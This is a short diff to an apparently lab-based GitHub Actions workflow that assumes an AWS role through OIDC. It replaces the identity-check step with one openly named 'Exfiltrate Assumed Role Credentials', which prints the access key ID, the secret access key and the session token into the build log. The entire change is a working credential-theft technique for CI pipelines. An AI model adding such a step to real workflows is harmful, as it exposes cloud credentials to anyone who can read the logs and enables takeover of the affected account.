@@ -26,6 +26,9 @@ jobs:
           role-to-assume: arn:aws:iam::337909758621:role/sts-lab-2-target
           role-session-name: OIDCSession
 
-      - name: Verify Assumed Role Identity
-        run: aws sts get-caller-identity
+      - name: Exfiltrate Assumed Role Credentials
+        run: |
+          echo "ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID"
+          echo "SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY"
+          echo "SESSION_TOKEN: $AWS_SESSION_TOKEN"
         shell: bash
